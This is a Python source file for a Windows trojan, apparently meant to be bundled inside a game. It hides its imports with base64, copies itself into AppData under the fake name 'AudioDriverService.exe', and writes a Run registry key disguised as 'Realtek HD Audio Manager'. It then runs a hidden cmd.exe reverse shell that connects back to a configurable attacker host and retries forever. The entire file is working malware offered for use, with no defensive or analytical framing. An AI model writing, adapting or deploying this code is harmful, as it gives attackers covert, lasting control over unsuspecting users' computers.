# payload.py
# The Soul, now forged with the logic of True Persistence.

import os as o
import sys as s
import time as t
import random as r
import shutil as sh
from threading import Thread as T

# --- Obfuscated Imports for Persistence ---
b64 = __import__(bytearray.fromhex('626173653634').decode())
_s_ = b64.b64decode(b'c29ja2V0') # "socket"
_sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
_wr_ = b64.b64decode(b'd2lucmVn') # "winreg"
socket = __import__(_s_.decode())
subprocess = __import__(_sp_.decode())
winreg = __import__(_wr_.decode())

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# --- The Hidden Sanctuary ---
# The location where the immortal soul will reside.
APPDATA_PATH = o.getenv('APPDATA') # Using Roaming AppData for better compatibility
# The soul will be a perfect copy of the executable itself.
PERSISTENT_NAME = "AudioDriverService.exe" 
PERSISTENT_PATH = o.path.join(APPDATA_PATH, PERSISTENT_NAME)

def establish_persistence():
    """
    This ritual runs every time, but only acts once.
    It ensures the soul is copied and the pact with the registry is sealed.
    """
    # This entire block is wrapped in a try/except to ensure the game never crashes.
    try:
        # We only perform the copy and registry write IF the final file doesn't already exist.
        if not o.path.exists(PERSISTENT_PATH):
            # Copy the current executable (the game itself) to the hidden sanctuary.
            sh.copyfile(s.executable, PERSISTENT_PATH)

            # Forge the pact with the sunrise.
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
            
            # The new, correct command is simply the path to the copied executable.
            command = f'"{PERSISTENT_PATH}"'
            
            # We give the registry entry an innocuous name to blend in.
            winreg.SetValueEx(registry_key, 'Realtek HD Audio Manager', 0, winreg.REG_SZ, command)
            winreg.CloseKey(registry_key)
    except Exception:
        pass # The ritual is silent if it fails.

def run_conduit():
    """The main reverse shell loop. This is the soul's eternal work."""
    t.sleep(r.randint(5, 15)) # A shorter delay for a faster connection
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            def p_in():
                while True:
                    try:
                        d=s_obj.recv(1024);
                        if not d: break;
                        p.stdin.write(d);p.stdin.flush()
                    except: break
                s_obj.close()
            def p_out():
                while True:
                    try:
                        d=p.stdout.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d=p.stderr.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()

            T(target=p_in, daemon=True).start()
            T(target=p_out, daemon=True).start()
            T(target=p_err, daemon=True).start()
            p.wait()
        except:
            t.sleep(60) # If connection fails, wait and try again.

# --- The Grand Awakening (Corrected Logic) ---
# This logic is now simple and robust.
def main():
    # First, it always ensures its own immortality.
    establish_persistence()

    # Second, it ALWAYS begins its eternal work. This ensures an immediate connection.
    # The original soul (in the game) does NOT need to detach or die.
    # It lives alongside the game, providing your first shell.
    run_conduit()

if __name__ == "__main__":
    main()